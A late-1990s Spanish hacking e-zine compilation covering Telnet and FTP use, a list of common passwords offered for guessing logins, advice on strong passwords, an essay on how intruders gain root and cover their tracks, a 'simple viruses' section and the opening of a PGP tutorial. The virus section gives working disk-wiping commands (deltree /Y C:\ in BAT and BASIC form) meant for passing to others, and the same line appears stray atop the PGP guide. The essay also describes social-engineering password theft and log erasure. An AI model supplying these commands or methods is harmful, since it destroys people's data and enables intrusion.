amigo que ya conoce todo el mundo y el Ftp,si si,has leido bien el 95 (bueno en realidad el 
MS2) trae una version bastante simple (pero util) de programa FTP.

TELNET.
en la carpeta windows (o como la ayas llamado) hay un .exe que se llama Telnet,este programa
sirve para hacer conexiones desde tu sistema a otro remoto a traves de una red (internet
principalmente),en lo que consiste basicamente este programa es en acceder a unos determinados
puesrtos de un sistema remoto en los cuales puedes hacer varias cosas,como por ejm:
bajarte el correo,mirar el directorio de una web.....
aqui te expongo una lista de los puertos con una descripcion de para lo que vale cada uno de 
ellos:(el numero que aparece entre parentesis es el puerto)
auth (113)
conference (531)
courier (530)
daytime (13)
discard (9)
domain (53)
echo (7)
efs (520)
exec (512)
finger (79)
ftp (21)
gopher (70)
hostnames (101)
http (80)
ingreslock (1524)
link (87)
login (513)
mtp (57)
nameserver (42)
netbios (139)
netnews (532)
netstat (15)
nntp (119)
pop2 (109)
pop3 (110)
proxy (8080)
qotd (17)
remotefs (556)
rje (77)
sftp (115)
shell (514)
smtp (25)
spooler (515)
sunrpc (111)
supdup (95)
systat (11)
telnet (23)
tempo (526)
tftp (69)
time (37)
uucp (540)
uucp-path (117)
whois (43)
www (80)

¿como se hace un Telnet?
pues hacerlo es muy simple:

si nos proporcionan la
dirección telnet "maquina.remota.es 2010" hariamos lo siguiente: (puede
variar segun sistemas):
  * Tecleamos en la linea de comandos "TELNET maquina.remota.es 2010" (En
    otros sistemas teclearemos "TELNET" y después "OPEN maquina.remota.es
    2010" ) con lo que veremos algo parecido a esto:

    * telnet MAQUINA.REMOTA.ES 2010
    * Trying 130.132.21.53 Port 2010 ...
    * Connected to MAQUINA.REMOTA.ES
    * Escape character is ...

  * Esto nos dice más o menos que está intentando conectar con la dirección,
    nos devuelve la dirección IP, se conecta, y nos dice cual es el "caracter
    escape".
  * Una vez hemos conectado se nos pide un "login" y/o "password" para entrar
    a la máquina remota. En algunos casos podremos conectar a la maquina
    remota con el login "guest" (invitado) pero la mayoria de las veces
    deberemos saber el login antes de conectarnos.
  * El siguiente paso es configurar la emulación de terminal, es decir,
    decirle al sitio remoto como queremos que nos muestre los datos en
    nuestra pantalla. La configuración más común es la VT100, que es la
    estandar para las comunicaciones basadas en terminales. (algunos clientes
    telnet configuran ellos sólos la emulación).
  * El último paso (después de haber utilizado el servicio es salir ;-) Como
    las pulsaciones de tecla no las hacemos "realmente" en nuestra máquina,
    sino en la máquina remota, necesitamos el "caracter escape" que se nos
    dió al conectar para pasar al "modo comando" ( habitualmente teclas
    control + paréntesis derecho ).

Comandos disponibles:

CLOSE         Termina la conexión TELNET con la maquina remota y vuelve al
"modo comando" (si empezamos alli) o sale de TELNET.
QUIT           Sale del programa TELNET; si estás conectado a una máquina
remota, QUIT te desconecta y luego sale de TELNET.
SET ECHO   Si no ves lo que estás escribiendo, o si escribes y ves doble,
este comando soluciona el problema.
OPEN           Abre una conexión a una máquina remota.

ATENCION: Al presionar las teclas Enter o Return, sales del modo comando TELNET y
vuelves a la sesión TELNET.
te dejo aqui,investiga y juega con telnet,no es muy dificil y pronto aprenderas a usarlo
de una manera mas "productiva"

FTP-MS2
si entras en Ms2 y en el promp pones "ftp" te saldra esto "ftp>"
ahora parasaber los comandos que puedes usar pon "?" y te saldra unalista de los comandos
que puedes usar en el programa,juega con ellos y prueba cosas

9.PROXImamente....
pues la verdad es que no se que voy a incluir,si tienes algo que comentar o quieres mandarme
cosas nuevas ya sabes mandamelas a zed@mixmail.com
y sera incluido en la proxima actualizacion

bye--:) 

//////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

8.                       LISTADO DE PASSWORDS MAS USADOS

la lista de los passwords mas utilizados es algo que aumenta todos los dias por ello,aqui te 
presento la ultima lista mas "actualizada" que he logrado recopilar.
detodas maneras supongo que ya sabras que hay otros metodos mas rapidos,pero si lo quieres 
hacer a la manera tradicional...aqui tienes la lista:

aaa,academia,ada,adrian,aerobics,airplane,
albany,albatross,albert,alex,alexander,algebra,alias,
alisa,alpha,alphabet,ama,amy,analog,anchor,
andy,andrea,animal,answer,anything,arrow,arthur,ass,asshole,
athena,atmosphere,
bacchus,badass,bailey,banana,bandit,banks,bass,batman,beautiful,beauty,
beaver,daniel,danny,dave,deb,
debbie,deborah,december,desire,desperate,develop,
diet,digitaldiscovery,
disney,dog,drought,duncan,easy,eatme,edges,edwin,egghead,eileen,einstein,
elephant,elizabeth,ellen,emerald,engine,
engineer,enterprise,enzyme,euclid,evelyn,extension,fairway,felicia,
fender,finite,format,god,
hello,idiot,jester,john,johnny,joseph,joshua,momioso;),judith,juggle,
julia,kathleen,
kermit,kernel,knight,lambda,larry,
lazarus,lee,leroy,lewis,light,lisa,louis,love,lynne,mac,
macintosh,mack,
maggot,magic,malcolm,mark,markus,martin,marty,marvin,matt,master,maurice,
maximum,merlin,mets,michael,michelle,
mike,minimum,nicki,nicole,rascal,really,rebecca,remote,rick,reagan,robot,
robotics,rolex,ronald,rose,rosebud,rosemary,roses,ruben,
rules,ruth,sal,saxon,
scheme,scott,secret,sensor,serenit,sex,shark,
sharon,shit,shiva,shuttle,simon,simple,singer,single,singing,smile,
smooch,smother,snatch,
snoopy,soap,socrates,spit,spring,subway,success,summer,super,support,
surfer,suzanne,tangerine,tape,target,
taylor,telephone,temptation,tiger,tigger,toggle,tomato,toyota,trivial,unhappy
unicorn,unknown,urchin,utility,vicki,virgin,virginia,warren,water,
weenie,whatnot,whitney,will,william,
winston,willie,wizard,wonbat,yosemite,zap.
os recomiendo que meteais primero "uknow" (mayusculas o minusculas)
por que es la que por defecto se mete.

muchos de los que aveis leido alguna vez una lista de los passwords mas comunes (una como esta) os
habreis dado cuenta de que alguna de las contraseñas que usais estan en la lista y os preguntais (y ami tambien me lo preguntan algunos) "¿como elijo una buena contraseña?" la respuesta la tienes justo debajo de esto que estas lellendo:

8.1      COMO ELEJIR UNA BUENA CONTRASEÑA

Fiarse de todo el mundo y no fiarse de nadie son dos vicios: pero en el uno se encuentra más 
virtud y en el otro mas seguridad. 
Lucio Anneo Séneca. Filósofo, poeta y orador latino nacido en Córdoba. 
Con los recientes avances de la criptografía, sistemas de clave pública, RSA, DES, 
one-time-pad etc. etc. podemos estar seguros de que nuestros datos están a salvo de miradas 
indiscretas ¿ o tal vez no ? 
Pese a todos estos progresos, o quizá debido a ellos, cada vez está más claro que hay un 
punto débil en el proceso ¿cual? nosostros, o más concretamente la forma en que elegimos las 
claves (passwords). 
Sea cual sea tu sistema de seguridad, si tu clave es mala estás comprometiendo tus datos. 
Supongamos que debes elegir una clave de 5 letras, aparentemente la entropía 
(número de combinaciones posibles para entendernos) es de 26^5 , aproximadamente 1.118x10^7; 
sin embargo la mayoría de los usuarios se inclinan por escoger nombres comunes, la mayoría de 
las cuales se encuentra en una lista de 6000-7000 palabras, de esta manera la entropía real 
es del orden de 6.5x10^3 , cuatro ordenes de magnitud menor. 
En el momento en que escoges una clave ordinaria, fácil de recordar, estás corriendo el 
riesgo de un ataque con diccionario, cualquier cracker que se precie encontrará la clave 
muy rápidamente. Se ha dicho también que cualquiera que crea estar a salvo poniendo como 
clave su nombre al reves, el nombre de su novia o su número de teléfono es un ingenuo que 
muy pronto se encontrará en problemas (ver el el artículo sobre Sandra Bullock en el anterior 
número). 
Los criptoanalistas (o simplemente crackers habilidosos) pueden explotar con éxito nuestras 
inclinaciones , contexto cultural etc. No deberías escoger acrónimos de canciones populares, 
frases comunes de la TV o similares, te sorprendería saber la cantidad de información de este 
tipo que ya hay recopilada y lista para usarse en un programa para romper claves. En general 
no deberías usar frases o expresiones que hayas visto u oido anteriormente. 
Entonces, ¿ que podemos hacer ?. Se trata de llegar a un equilibrio entre facilidad de 
recordar y seguridad. Por ejemplo generar claves aleatorias parece una buena idea pero es 
dificil recordar claves como #wEr5ft!, y desde luego no es buena idea dejar apuntadas tus 
claves, antes o despues alguien las leerá. 
Bien, la mejor idea parece ser hacer frases sin sentido y/o que contengan cosas totalmente 
ajenas a tu entorno y modo de ser, podrían contener expresiones racistas, sexuales y faltas 
de ortografía,esto es aceptable porque despues de todo la clave no es algo que se haga 
público, no deberías saberla más que tu. El mismo hecho de elegir una frase chocante para 
tí hara que la evocación emocional la haga fácil de recordar. 
Algunos programas admiten claves de longitud ilimitada, en ese caso una frase del tipo 
descrito anteriormente, formada por cuatro o cinco palabras escogidas de un vocabulario de 
unos pocos miles proporciona claves con 58-60 bits de entropía (más de lo necesario para 
algoritmos como DES, uno de los estándares en criptografía), en este caso no es necesario 
incluir números o símbolos para aumentar el número de claves posible. 
Si el programa que usas no admite más que unos pocos caracteres el procedimiento más seguro 
es: escribe una frase del tipo que proponemos en este artículo, pasala a traves de un 
algoritmo como MD5 o SHA que producirá un hash de al menos 128 bits, procesa esta salida con 
UUENCODE y obtendrás una ristra de caracteres ASCII de la que puedes extraer tu clave. 
Nuestro programa KEY, a partir de la versión 1.2 usa un algoritmo SHA para obtener 
secuencias de 160 bits y una gran seguridad, sin embargo ¡ elige bien tu clave ! 
Debo la mayor parte de la información de este artículo a las PASSWORD.FAQ de Grady Ward 
(grady@netcom.com). Gracias a él y a todos los que en la red, creen que el conocimiento 
debe compartirse. 
Comentarios, peticiones (no, no te puedo dejar dinero), sugerencias: 
SPREE 
////////////////////////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

9.                                                *********************
***   Intrusos    ***
***      de       ***
*** Guante Blanco ***
***  by LordVader ***
************************************
***   lordvader@mixmail.com      ***
***www.civila.com/hispania/fliper***
                  ***miembro del HacK`S-wEb-RiNg   ***  
		      ***http://come.to/HaCkS-wEb-RiNg ***
************************************



Antes de nada hay que aclarar algunos conceptos. La gente tiende a llamar hacker a cualquier 
persona que se dedica a violar la seguridad de los sistemas. Si, realmente un hacker se dedica
 a irrumpir en ordenadores a los que no tiene acceso, pero debemos distinguirlos de los 
crakers, cuyo principio es el mismo, pero con fines totalmente opuestos. Ambos estudian 
el modo de entrar pero, a diferencia del hacker, el cracker destroza toda lo que puede 
mientras que este solo deja una nota informando a los administradores sobre su intrusion; 
incluso a veces informa sobre los errores de seguridad y como subsanarlos.

Un ejemplo de cracker lo podemos encontrar en un suceso ocurrido hace algunos años. 
Robert Morris, oprvechando un enorme fallo de seguridad, introdujo un gusano en la red 
causando un gran caos. Mas de 6.000 ordenadores quedaron inutilizados durante varias semanas.

En el lado opuesto, recientemente unos hackers se introdujeron en un hospital y obtuvieron 
una copia de la mediacion de algunos de sus pacientes. Seguidamente aparecion en un medio 
de comunicacion informando sobre los errores de seguridad y las terribles consecuencias que 
hubiera tenido la entrada de alguien con propositos destructivos. Perfectamente podian haber 
cambiado las medicacniones y causar un enorme caos en el hospital, por no hablar de las 
muertes que se hubieran producido.

Dentro de la cumunidad hacker hay cuatro tipos diferentes. Los newbies o aprendices son 
los novatos; gente con muchas ganas de aprender y que con el tiempo se convertiran en 
verdaderos hackers. 

Luego estan los hackers en si, que son la mayoria. Tienen unos conocimientos aceptables 
sobre redes (mas concretamente internet), sistemas operativos (sobre todo Unix y derivados), 
programacion (varios lenguajes) e incluso pueden que sepan electronica y telefonia. 
La minoria esta constituida por la elite (o tambien 31173), que son los verdaros expertos 
y cuentan con conocimientos muy avanzados sobre todo lo relacionado con la informatica, ya 
que suelen ser administradores de sistemas y gente que lleva muchos años estudiando el 
complicado mundo de los ordenadores. Y por ultimo esta la "CARROÑA", los lamers. Estos 
hombrecillos no tienen apenas conocimientos de ordenadores, son gente que vive de la 
fantasia, que hoy quiere ser hacker y mañana superman, que busca amigos hackers no para 
aprender sino para obtener informacion sobre algun sistema y luego fanfarronear ante todos 
los demas, gente que nunca llegara a nada. La mayoria termina convirtiendose en crackers.

Hay genta que opina que se puede hacer un retrato robot de un hacker : "...es un ser 
introbertido, inteligente,poco sociable, descuidado en cuanto a su forma de vestir...". Pero los topicos no siempre son ciertos, la mayoria de los hackers son gente normal, de esa que vemos todos los dias por la calle. Solo uan pequeña minoria son antisociales debido a que son "demasiado inteligentes" para unirse al resto de los mortales. Son los mas solitarios de la red, ya que actuan solos y mantienen el anonimato.

Respecto a como trabajan, es facil de suponer, todas intrusiones son debidas en su mayoria 
a los descuidos de los administradoes de la red. Ningun sistema es seguro tal y como 
demostraron unos hackers modificando la pagina web del prestigioso buscador Yahoo.

Los ordenadores conectados a internet nos ofrecen una serie de servicios "web, telnet, 
ftp, news, mail, IRC,..." cada uno de lo cuales utilizan un puerto con unos 
protocolosdeterminados, pero, ¿que es un puerto?. Imaginemos un ordenador personal 
con impresora (LPT), raton (COM), etc.. Cada periferico tiene un puerto para poder 
realizar sus funciones. Con los servidores de internet pasa algo muy parecido solo que 
utilizan muchos mas puertos, uno distinto por cada servicio que ofrezcan. 

Cualquiera de nosotros que tenemos acceso a internet podemos observar que un solo 
ordenador no realiza todas las funciones. Por ejemplo que tenemos contratado un alta 
con la empresa internet.es. Es muy probable que la web sea "www.internet.es" (servidor de http) y que para el correo electronico utilice dos servidores distintos: "mail.internet.es" (puerto de POP3 para el correo entrante) y "smtp.internet.es" (puerto SMTP para el correo saliente). Tambien es probable que el proveedor nos ofrezca servicios de news, para cual posiblemente se unsara el servidor "news.internet.es" (puerto NNTP), o que nos permita emplear parte de su discoduro para conectarnos via telnet y/o ftp.

Para entenderlo mejor podemos imaginarnos una fortaleza (el servidor) con una serie de entradas para acceder a su interior (los puertos). 

Estas entradas solo deven de estar abiertas en caso de que realmente se utilicen, de manera 
que cuantos menos puertos haya abiertos, menores posibilidades de entrar habra. Por ello, si 
utilizamos un servidor nada mas que para mostrar paginas web, es un herror muy grande dejar 
abiertos otros puertos.

Y ahora os preguntareis ¿como buscan la informacion?, ¿no?. Pos bien de entre los multiples 
servicios de Internet cabe destacar el telnet, que nos permite conectarnos a un ordenador de 
manera que, una vez dentro, podamos trabajar como si de nuestro ordenador se tratara, pero 
eso si, usando su sistema operativo. Tambien hay otro servicio, el ftp, que facilita el envio
 y la recepcion e datos entre maquinas, aunque sin permitir la ejecucion de ningun programa 
en el ordenador remoto. Para poder utilizar y  poder entrar en los ordenadores remotos hay 
que introducir un nombre de usuario (loing) y una contraseña (password)

En los servidores suelen correr sistemas operativos como windows NT, Unix o algun derivado 
de este: AIX, SunOs, Solaris, Irix, Convex, Linux... Este tipo de sistemas son multiusario, 
por lo que permiten acceder muchas personas al mismo tiempo, cada una con un directorio de 
trabajo y unos previlegios determinados, de manera que el usuario "user1" no pueda ver la 
parte de disco duro de "user2", ademas de no acceder a muchas partes del sistema, como la 
configuracion de este. 

Solo un usuario conocido como root o superusuario, tiene poder para hacer lo que realmente 
quiera. Este es el administrador del sistema, encargado de su correcto funcionamiento. Si 
alguna persona con fines destructivos conseguiera ser superusuario, las consecuencias podrian 
desastrosas. Incluso podria negarle acceso al propio administrador.

Todo sistema Unix tiene un fichero llamado "passwd" o "shadow" que contiene datos y 
contraseñas de los usuarios. Este fichero puede obternerlo y leerlo cualquier persona con 
acceso al servidor sin necesidad de tener unos conocimientos muy amplios. Naturalmente, 
las contraseñas estan encriptadas con un alogaritmo que no permite descifrado. Podemos 
cifrar una palabra 100 veces que nuca nos dara  la misma cadena resultante. Pero, si 
nosotros no podemos desencriptarlo, tampoco podra el sistema.

Cuando introducimos una contraseña, el sistema la encripta y la compara con una parte 
de la almacenada en el fichero "passwd" o "shadow", dependiendo de la configuracion. 
Si coincide, la da como valida y nos permite el acceso. De la misma manera un hacker 
puede capturar este fichero y con un diccionario y un pequeño programa ir encriptando 
y comparando palabas hasta dar con la contraseña buscada.

Esta claro que la finalidad de un hacker es llegar a ser root, pero ¿como consegue entrar?, 
y una vez dentro ¿como logra el control absoluto de la maquina?

El primer paso y uno de los importantes es odtener la mayor informacion de la maquina a la 
que quieres entrar. Para ello se sigue una serie de pasos. El primero es explorar los puertos 
buscando las posibles entradas. Una vez obtenidas, se accede a cada uno de estos puertos para 
conocer la version del protocolo utilizado, ya que muchos de estos tiene bugs que pueden ser 
claves para entrar.

La mayoria de estos errores permiten obtener el fichero "passwd" si necesidad de entrar en el 
servidor. Los puertos mas explotados para estos fines so el SMTP, HTTP y FTP. Algunos puertos 
nos dan informacion muy valiosa sobre el estado de la red y/o los usuarios pertenecientes al 
sistema.

Otra forma de obtener informacion es mediante la llamada "ingenieria social". Se trata de 
convencer (normalmente engañar) a un usuario para que te revele sus contraseñas. Los medios 
mas comunes para lograrlo son los canles de chat del IRC y el correo falsificado. Por ejemplo, hacinendonos pasar por el administrador del sistema podemos avisar al usuario de que debemos conocer su "login" y "password" para una reestauracion del sistema de archivos debido a... (la excusa queda a gusto de vosotros).

Hay veces que la entrada es mucho mas sencilla. Todos los sistemas tienen unas cuentas con 
"login" y "password" por defecto que el administrador, a menudo, olvida eliminar. Ademas, 
el servicio de ftp, a no ser que se trate de una empresa privada, suele tener un usuario 
llamado "anonymous" cuya contraseña es nuestro loing o simplemente "guest". Un hacker con 
unos conocimientos medios, enseguida se da cuenta de tremendos fallos configuracion, como 
por ejemplo dejar con permiso de escritura a ficheros que nada mas deveria poder modificar 
el superusuario.

Una vez que el hacker consigue tener acceso, la meta es ser superusuario. El primer paso es 
hechar un vistazo por el sistema en busca de errores de configuracion. Muchos administradores
 permiten acceder, de manera no voluntaria, a ciertos lugares clave del sistema, en los 
cuales una persona con ciertos conocimientos podria realizar algunas modificaciones y ganar
 privilegios de root. Si esto falla, el hacker probara los "exploits" 
(programas para explorar los bugs) conocidos para la version del sistema determinado. Si 
la version del sistema operativo es antigua y no esta parcheada, pueden haber muchas formas
 de obtener privilegios de root.

¿Que ocurre cuando el hacker ya es superusuario? Primero un respiro. Ya estan en la cima. 
Por un momento se sienten superior al administrador y probablemente le dejen un mensaje de 
bienvenida, para que al dia siguiente lo vea y sea consciente de los errores de seguridad 
de su sistema. Pero esto no es todo. Aqui no termina el trabajo. No todos los administradores 
se lo toman con buen humor. Algunos no saben diferenciar un hacker de un cracker y es muy 
probable que vayan a por él.

Por eso, una vez obtenido el root comienza otra enorme tarea: borrar todas las huellas que 
se han ido dejando.

Todo sistema guarda una serie de registros (logs) con todas las operaciones que se lleban a 
cabo dentro del servidor: quien se conecta, desde donde se conecta, a que hora, que programas
 a ejecutado, etc... El hacker como tiene privilegios de root, puede borrar todo rastro que 
haya dejado (a no ser que los logs en vez de guardarse en un fichero sean enviados por mail
 a otro servidor, tras lo cual no le queda mas remedio que entrar tambien en el otro para 
borrar las huellas); pero para eso ha de tener unos amplios conocemientos sobre sistemas 
operativos y programacion.

Ademas de borrar las huellas del sistema son muy cautelosos, de forma que cuando van a 
obtener el root de un ordenador no prenetan directamente en el, sino  que van dando saltos de 
un ordenador a otro con lo que su rastro se hace mas dificil de seguir.

Una vez contenido el control total, tambien es muy posible que el hacker instale un snifer 
o programas que monitoriza la red y cuya mision principal es obtener todas las contraseñas 
que entren o salgan del servidor. Estos datos pueden servirle para poder entar entrar en 
otros sistemas, ya que obtiene los loing y las contraseñas.

Hoy en dia existen nuchas medidas de seguridad, pero tambien aparecen tecnicas para burlarlas. 
Un ejemplo lo tenemos en los firewalls o paredes de fuego, cuya finalidad es filtrar el acceso 
mediante el reconocimiento del IP (clave de indentificacion unica de un ordenador en internet).
 El caso es que los hackers utilizan tecnicas de spoofing que consisten en engañar al servidor
 camuflando su identidad bajo el IP de un trusted host (ordenador amigo al que si se le esta
 permitido el acceso).

Hay infinidad de tecnicas, mas o menos complicadas, para atentar contra la seguridad de un
 sistema. Si los administradores pusieran algo mas de interes en su trabajo podrian evitar
 estas intrusiones. 

En primer lugar podrian comenzar en por cerrar los puertos no cerrados, 
(especialmente sysat, netstat, finger, rloing, etc...) y mantener telnet 
y ftp solo en caso necesario. Tambien podrian eliminar o bloquear las cuentas 
que el sistema tiene por defecto (guest, system, postmaster, etc...) y estar al
 corriente de los bugs que aparecen constantemente para parchearlos en cuanto tengan ocasion.

Hay listas de correo (tambien usadas por los hackers, naturalmente) que nos mantienen 
constantemente informados de los agujeros encontrados en los distintos sistemas. 
Algunas de estas listas se pueden obtener en "www.geek-girl.com/bugtraq/index.html"
 o en "www.bugnet.com".

Ademas, en "http://raregazz.islatortuga.com/bugs.html" se pueden encontrar los bugs 
mas recientes traducidos al castellano. Tambien seria recomendable para los administradores 
visitar paginas de hackers, ya que en ellas pueden encontrar utilidades y textos importantes 
escritos por otros hackers, muchos de ellos tambien administradores.
////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

10.            VIRUS SENCILLOS (QUE NO INUTILES)

los que os presento aqui no son realmente virus,pero si son pequenños programas que hacen 
algunas cosas similares.
un virus lo que pretende es joder (propiamente dicho) la maquina en la que se introduce 
¿verdad? vale
asta a qui todo claro,existen virus que rompen la tabla de particion otros te borran 
archivos con determinadas extensiones...etc....,bien pues la mayoria de estos virus 
los puedes hacer,no iguales peri si similares,con un pelin de conocimiento de Qbasic,Gwbasic,
Basic o incluso con un simple BAT.

para el caso de los tres primeros si lo que quieres es formatear el HD es simple solo 
tienes que poner:
10 shell "C:\windows\command\deltree.exe C:\*.* /Y"

el 10 es la linea en GWBasic y en otros compatibles de Basic pero no es necesaria
luego lo puedes compilar con el  Turbo Basic o incluso con el Q Basic de Microsoft 
(!!hombre si vale para algo¡¡)
algo mas sencillo todavia,haciendo un BATCH (BAT) y pones lo siguiente
                            @echo off
                            deltree /Y C:\
o bien
C:\windows\command\deltree.exe /Y C:\
ahora puede surjiros un pequeño problema,que al que le paseis el "virus" no tenga la 
carpeta de windows en c:\windows pero tambien hay una solucion a esto
no poner "windows" por que windows siempre pone el directorio command a su PATH.
luego el Bat se puede pasar a COM con algunas utilerias que casitodo el mundo conoce

esto lo he hecho con el DELTREE pero seguro que ati se te ocurren mas cosas ;-)
            (SED BUENOS....)
///////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

11.                           Guia del PGP v.2.6.3¡
10 shell "C:\windows\command\deltree.exe C:\*.* /Y"
Luis G. del Valle




PGP (Pretty Good Privacy) es un programa desarrollado por Philip Zimmermann. Reelaborado 
para su uso internacional  por Ståle Schumacher.

Los autores han difundido el programa gratuitamente. Lo cual no quiere decir que no 
tengan derechos de autor. Esta distribución gratuita es para usos no comerciales. Ver 
el capítulo "legal Issues" en pgpdoc1.txt y en pgpdoc2.txt que forman parte del paquete 
de distribución del PGP.

En el mismo espíritu de los autores la distribución de este instructivo es también gratuita. 
Si se cita, favor de señalar la fuente.

Quien tenga mi llave pública podrá comprobar que no se la ha hecho ningún cambio a mi texto 
si tiene este documento como archivo en word para windows 6.0 y tiene también el archivo de 
firma: pgpinstr.sig. Ambos archivos, compactados están en el archivo pgpinstr.zip.

Cualquier observación respecto al instructivo es bien recibida. Escribir a: 
lvalle@mixcoac.uia.mx 



México, D.F. octubre de 1996
(Revisión: marzo 1998)

PGPINSTR.DOC.  Grabado el 05/03/98 10:15 AM

INSTRUCTIVO PARA MANEJAR EL PGP
(Pretty Good Privacy)
Luis G. del Valle
I. Cargar debidamente el programa	
A. Obtener el programa	
B. Crear el directorio: c:\pgp	
C. Descompactar pgp263i.zip	
D. Modificar el autoexec.bat	
E. Modificar el config.txt	
II. Generar el propio par de llaves, pública y privada.	
A. El nombre que va a estar en las llaves	
B. La frase que irá embebida en la llave	
C. Nivel de seguridad	
D. Generar el par de llaves	
E. Qué hacer con los 2 archivos: pubring.pgp y secring.pgp	
III. Practicar el cifrado y descifrado a la manera tradicional	
A. Por qué esta práctica	
B. Comandos para cifrar y descifrar	
C. Cifrar y codificar en ASCIIs simples	
D. Guardar tu llave pública en un archivo que sea tu_nombre.asc	
E. El PGP habla de "armadura" de ASCIIs	
IV. Intercambiar llaves públicas	
A. Conservar la propia llave pública	
B. Guardar llaves públicas en el llavero propio	
C. Certeza sobre que la llave es de quien dice que es	
1. Solución por medio de la huella digital de la llave	
2. Solución por medio de llaves firmadas, o autenticadas	
D. Guardar una llave recibida en formato llave.pgp y no en llave.asc	
E. Cómo se firman las llaves	
F. Cómo aislo la llave de Juan Juárez	
G. Examinar nuestro llavero público	
H. Observaciones	
I. Digresión de preguntas y respuestas	
V. Cifrar archivos al modo del PGP	
A. Cifrar para otros	
B. Pero salen varias dudas	
1. Hay dos o más que tienen el mismo identificador	
2. Cifrar para varios	
3. Cómo firmar el texto además de cifrarlo	
4. Si mi archivo por cifrar es muy grande	
5. Un escrito muy confidencial	
C. Digresión de preguntas y respuestas	
VI. Descifrar los archivos recibidos	
A. Caso ordinario	
B. Situaciones especiales al descifrar	
1. Quiero leer el archivo descifrado en mi pantalla, sin que se grabe en mi disco.	
2. Me llegaron varios archivos cifrados con el mismo nombre y extensiones en serie: 
carta.as1, carta.as2, carta.as3...	
3. Al descifrar me dice el PGP que el archivo está firmado, pero que el firmante es 
desconocido	
VII. Firmar archivos de texto abierto	
A. Para qué firmar sin cifrar	
B. Condiciones para pgpfirmar un texto abierto	
C. Procedimiento	
D. Comprobar la firma	
E. La pgpfirma en archivo separado del texto	
VIII. Manejo de llaveros y de llaves	
IX. Complementos	
A. El parámetro -p	
B. El parámetro -o	
C. El parámetro -u	
D. El número hexadecimal de la llave como identificador	
E. El archivo randseed.bin	
F. Archivos por cifrar en otros directorios que no son \PGP	
X. Frentes para PGP en DOS y en windows	
INSTRUCTIVO PARA MANEJAR EL PGP
Si vas a usar el programa es porque estás convencido de su utilidad. Algunos de sus usos: 
guardar en la propia computadora archivos en clave de alta seguridad. Transmitir por correo 
electrónico o por otros medios (en disquetes) archivos cifrados, de manera que sólo los pueda 
descifrar aquél o aquellos para quienes los hayas cifrado: cartas confidenciales, información 
reservada, 
I.Cargar debidamente el programa
A.Obtener el programa
El archivo se llama pgp263i.zip. Se puede obtener de alguien que lo tenga en disquete, o 
bien por internet. El programa, información y auxiliares:
Visitar: http://www.pgpi.com/ Es la página internacional del PGP. Allí se puede bajar el 
programa o encontrar lugares para ftp y para recibirlo por correo electrónico.

A.Crear el directorio: c:\pgp
B.Descompactar pgp263i.zip
Descompactar pgp263i.zip con pkunzip de modo que los archivos caigan en c:\pgp. Al 
descomprimirlo con pkunzip resultan algunos archivos, entre ellos otro zip (pgp263ii.zip) 
y pgp263ii.asc. Éste es la firma del anterior para checar con ayuda de la llave publica de 
Stale Schumacher que el archivo es auténtico. La llave de Stale resulta al descifrar el 
archivo keys.asc, que tambien es resultante de la descompresión de pgp263i.zip. El 
procedimiento para utilizar esto vendrá después.
Tener cuidado al descomprimir pgp263ii.zip de usar el parametro -d para que se haga el 
subdirectorio \doc y caigan allí los archivos correspondientes.
Sigue a continuacion la lista de los archivos como quedan. Se pueden luego borrar los 
pgp236ii.asc y pgp236ii.zip habiendo ya comprobado con el primero que el segundo archivo 
es auténtico, El segundo no se necesita por tener ya su contenido descompactado.
Directorio de C:\PGP	Directorio de C:\PGP\DOC	
	DOC.<DIR>		
	CONFIG. TXT	.	<DIR>	
	DE. HLP	. 	<DIR>	
	EN. HLP			
	ES. HLP		BLURB.TXT	
	KEYS. ASC		CHANGES.DOC	
	LANGUAGE.TXT		KEYSERV. DOC	
	MD5SUM.EXE		MITLICEN TXT	
	PGP.EXE		PGFORMAT DOC	
	PGP.HLP		PGP262I.DIF	
	PGP263II ASC		PGP263I.DIF	
	PGP263II ZIP		PGPDOC1.TXT	
	PGPSORT.EXE		PGPDOC2.TXT	
	README. 1ST		POLITIC.DOC	
	README. USA		PRZON26I ASC	
	SETUP.DOC		
A.Modificar el autoexec.bat
Se añaden los renglones:
	set pgppath=c:\pgp
	set tz=cst6cdt (Así para la ciudad de México: 6 horas al oeste de Greenwich).
	set path=c:\pgp;%path%, o bien se añade c:\pgp; en el path
A.Modificar el config.txt
Con un editor de textos, por ejemplo el edit de MSDOS de la versión 5 en adelante, modificar 
archivo config.txt del PGP. Mientras no se tengan las preferencias propias sugiero las 
siguientes:
MyName = "Juan Hernández" (Cada uno pondrá aquí su nombre entre comillas).
Language = es
CharSet = cp850
Pager = "pgp"
ArmorLines = 400
Armor = on	# Use -a flag for ASCII armor whenever applicable
TextMode = on	# Attempt to use -t option where applicable
Verbose = 1
Interactive = on	# Interactively prompt the user when adding keys (-ka)
EncryptToSelf = on	# Encrypt all messages with your own public key
Legal_Kludge = off	# Use backwards-compatible format
Completes_Needed = 1
Marginals_Needed = 2
Cert_Depth = 4
TZFix=0
I.Generar el propio par de llaves, pública y privada.
Se presupone que el programa está debidamente cargado y configurado. Es importante que esté 
nuestro nombre en el config.txt y que lo usemos igual en el par de llaves.
El comando para generar el par de llaves es muy sencillo. Pero hay que estar preparados.
A.El nombre que va a estar en las llaves
Por ejemplo: Juan Hernánez <jhdez@servidor.unam.mx>
Es conveniente que vaya una dirección electrónica. En caso de no tenerla puede ir un número de 
teléfono, o algo que identifique a la persona sin ambigüedades. No utilizar más que letras, 
signos y caracteres de ASCIIs simples. Por tanto no acentos, no eñes, no signos de abrir 
interrogación o admiración (¿ ¡).
También es conveniente que el nombre no sea institucional, sino individual. Si es 
institucional, varios conocerán la clave (frase contraseña), con mayor riesgo de que se 
filtre a otros. Y si alguno deja la institución se lleva el conocimiento de la clave y 
posiblemente el archivo-llave secreto. Si se quiere, quien cifra para la institución 
